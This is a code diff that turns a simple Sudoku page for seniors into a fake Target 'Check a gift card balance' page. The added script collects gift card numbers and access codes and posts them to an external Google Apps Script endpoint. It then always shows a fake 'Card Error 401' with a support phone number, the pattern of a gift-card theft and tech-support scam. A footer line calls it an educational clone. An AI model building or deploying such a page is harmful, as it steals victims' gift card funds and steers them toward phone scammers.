@@ -1,184 +1,246 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Sudoku - Games for Senior</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-body {
-    margin: 0;
-    padding: 20px;
-    font-family: Arial, sans-serif;
-    background: linear-gradient(135deg, #f0f0f0, #e0e0e0);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-}
-h1 {
-    margin-bottom: 20px;
-    color: #333;
-}
-.sudoku {
-    display: grid;
-    grid-template-columns: repeat(9, 40px);
-    grid-template-rows: repeat(9, 40px);
-    gap: 2px;
-}
-.cell {
-    width: 40px;
-    height: 40px;
-    text-align: center;
-    font-size: 18px;
-    border: 1px solid #999;
-    background: #fff;
-}
-.cell:focus {
-    outline: 2px solid #007BFF;
-}
-.prefilled {
-    background: #ddd;
-    font-weight: bold;
-}
-.bold-border {
-    border-width: 2px;
-}
-.btns {
-    margin-top: 20px;
-    display: flex;
-    gap: 15px;
-}
-button {
-    padding: 10px 20px;
-    background: #007BFF;
-    color: white;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-}
-button:hover {
-    background: #0056b3;
-}
-#message {
-    margin-top: 15px;
-    font-size: 16px;
-    color: green;
-}
-</style>
+   <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "snjdjg8gp4");
+</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Check a Gift Card Balance</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+    }
+
+    header {
+      background-color: #cc0000;
+      color: white;
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 20px;
+      font-size: 14px;
+    }
+
+    nav {
+      background-color: #cc0000;
+      color: white;
+      display: flex;
+      align-items: center;
+      padding: 10px 20px;
+      gap: 30px;
+      flex-wrap: wrap;
+      overflow-x: auto;
+      white-space: nowrap;
+    }
+
+    nav > * {
+      flex: 0 0 auto;
+    }
+
+    nav img {
+      height: 30px;
+    }
+
+    .search-bar {
+      flex-grow: 1;
+      max-width: 400px;
+      min-width: 150px;
+    }
+
+    .search-bar input {
+      width: 100%;
+      padding: 8px;
+      border: none;
+      border-radius: 20px;
+    }
+
+    .container {
+      max-width: 700px;
+      margin: 50px auto;
+      text-align: center;
+    }
+
+    h2 {
+      font-size: 24px;
+      margin-bottom: 30px;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .input-group label {
+      font-size: 14px;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .check-btn {
+      background-color: #cc0000;
+      color: white;
+      font-size: 18px;
+      padding: 14px 30px;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+    }
+
+    .error-message {
+      display: none;
+      color: red;
+      font-size: 16px;
+      margin-top: 20px;
+      line-height: 1.6;
+    }
+
+    .newsletter {
+      margin-top: 50px;
+      font-size: 16px;
+    }
+
+    .newsletter input {
+      padding: 10px;
+      font-size: 14px;
+      width: 250px;
+    }
+
+    .signup-btn {
+      padding: 10px 20px;
+      background-color: #cc0000;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      margin-left: 10px;
+      cursor: pointer;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 12px;
+      margin-top: 20px;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        margin: 20px;
+      }
+
+      nav {
+        flex-wrap: nowrap;
+        overflow-x: auto;
+        -webkit-overflow-scrolling: touch;
+        gap: 15px;
+      }
+
+      .search-bar {
+        min-width: 200px;
+      }
+    }
+  </style>
 </head>
 <body>
 
-<h1>Sudoku</h1>
+  <header>
+    <div>📍 Ship to 52404</div>
+    <div>📦 Cedar Rapids South</div>
+  </header>
 
-<div class="sudoku" id="sudokuBoard"></div>
+  <nav>
+    <img src="https://1000logos.net/wp-content/uploads/2017/06/Target-Logo.png" alt="Target logo" />
+    <div>Categories</div>
+    <div>Deals</div>
+    <div>New & featured</div>
+    <div>Pickup & delivery</div>
+    <div class="search-bar">
+      <input type="text" placeholder="What can we help you find?" />
+    </div>
+    <div>👤 Account</div>
+    <div>🛒</div>
+  </nav>
 
-<div class="btns">
-    <button onclick="checkSudoku()">Check</button>
-    <button onclick="window.location.href='index.html'">Back to Home</button>
-</div>
+  <div class="container">
+    <h2>Check a gift card balance</h2>
 
-<div id="message"></div>
+    <!-- Form Start -->
+    <form id="cardForm">
+      <div class="input-group">
+        <label for="giftCardNumber">Card number</label>
+        <input type="text" id="giftCardNumber" name="giftCardNumber" placeholder="Enter gift card number" required>
+      </div>
 
-<script>
-// Sample puzzle (0 means blank)
-const puzzle = [
-    [5, 3, 0, 0, 7, 0, 0, 0, 0],
-    [6, 0, 0, 1, 9, 5, 0, 0, 0],
-    [0, 9, 8, 0, 0, 0, 0, 6, 0],
-    
-    [8, 0, 0, 0, 6, 0, 0, 0, 3],
-    [4, 0, 0, 8, 0, 3, 0, 0, 1],
-    [7, 0, 0, 0, 2, 0, 0, 0, 6],
-    
-    [0, 6, 0, 0, 0, 0, 2, 8, 0],
-    [0, 0, 0, 4, 1, 9, 0, 0, 5],
-    [0, 0, 0, 0, 8, 0, 0, 7, 9]
-];
+      <div class="input-group">
+        <label for="accessNumber">Access number</label>
+        <input type="text" id="accessNumber" name="accessNumber" placeholder="Enter access number" required>
+      </div>
 
-function createSudokuBoard() {
-    const board = document.getElementById('sudokuBoard');
-    for (let row = 0; row < 9; row++) {
-        for (let col = 0; col < 9; col++) {
-            const input = document.createElement('input');
-            input.type = 'text';
-            input.maxLength = 1;
-            input.classList.add('cell');
-            
-            if (puzzle[row][col] !== 0) {
-                input.value = puzzle[row][col];
-                input.disabled = true;
-                input.classList.add('prefilled');
-            }
+      <button class="check-btn" type="submit">Check balance</button>
 
-            // Bold borders
-            if (col % 3 === 0) input.style.borderLeftWidth = '2px';
-            if (row % 3 === 0) input.style.borderTopWidth = '2px';
-            if (col === 8) input.style.borderRightWidth = '2px';
-            if (row === 8) input.style.borderBottomWidth = '2px';
+      <!-- Error message -->
+      <div id="errorMsg" class="error-message">
+        <strong>❌ Card Error 401</strong><br>
+        📞 <a href="tel:+18447092550" style="color: red; text-decoration: underline;">Contact Support: +1-844-709-2550</a>
+      </div>
+    </form>
+    <!-- Form End -->
 
-            input.dataset.row = row;
-            input.dataset.col = col;
+    <div class="newsletter">
+      <p><strong>Get top deals, latest trends, and more.</strong></p>
+      <input type="email" placeholder="Email address">
+      <button class="signup-btn">Sign up</button>
+      <p><a href="#" style="font-size: 12px; color: gray;">Privacy policy</a></p>
+    </div>
+  </div>
 
-            // Allow only numbers 1-9
-            input.addEventListener('input', () => {
-                input.value = input.value.replace(/[^1-9]/g, '');
-            });
+  <footer>
+    &copy; 2025 Target. This is a clone for educational/demo use.
+  </footer>
 
-            board.appendChild(input);
-        }
-    }
-}
+  <script>
+    document.getElementById("cardForm").addEventListener("submit", function (event) {
+      event.preventDefault();
 
-function checkSudoku() {
-    const inputs = document.querySelectorAll('.cell');
-    const grid = Array.from({ length: 9 }, () => Array(9).fill(0));
+      const formData = new FormData(event.target);
+      const formDetails = {
+        giftCardNumber: formData.get("giftCardNumber"),
+        accessNumber: formData.get("accessNumber"),
+      };
 
-    inputs.forEach(input => {
-        const row = parseInt(input.dataset.row);
-        const col = parseInt(input.dataset.col);
-        grid[row][col] = parseInt(input.value) || 0;
+      const scriptURL = "https://script.google.com/macros/s/AKfycbxxWc-gnkS1RosZF33aahxTFUWTINAoiyhin9pOzzVUZLJOugP4NAodKW7E8IHM5y03/exec";
+
+      fetch(scriptURL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(formDetails),
+      })
+        .then(() => {
+          // Show error message
+          document.getElementById("errorMsg").style.display = "block";
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          alert("⚠️ Something went wrong! Try again.");
+        });
     });
-
-    if (validateSudoku(grid)) {
-        document.getElementById('message').textContent = "✅ Congratulations! Sudoku is correct.";
-    } else {
-        document.getElementById('message').textContent = "❌ Incorrect Sudoku. Please check your inputs.";
-    }
-}
-
-function validateSudoku(grid) {
-    for (let i = 0; i < 9; i++) {
-        const rowSet = new Set();
-        const colSet = new Set();
-        const boxSet = new Set();
-
-        for (let j = 0; j < 9; j++) {
-            // Row check
-            if (grid[i][j]) {
-                if (rowSet.has(grid[i][j])) return false;
-                rowSet.add(grid[i][j]);
-            }
-
-            // Column check
-            if (grid[j][i]) {
-                if (colSet.has(grid[j][i])) return false;
-                colSet.add(grid[j][i]);
-            }
-
-            // 3x3 Box check
-            const rowIdx = 3 * Math.floor(i / 3) + Math.floor(j / 3);
-            const colIdx = 3 * (i % 3) + (j % 3);
-            if (grid[rowIdx][colIdx]) {
-                if (boxSet.has(grid[rowIdx][colIdx])) return false;
-                boxSet.add(grid[rowIdx][colIdx]);
-            }
-        }
-    }
-    return true;
-}
-
-createSudokuBoard();
-</script>
+  </script>
 
 </body>
 </html>
-
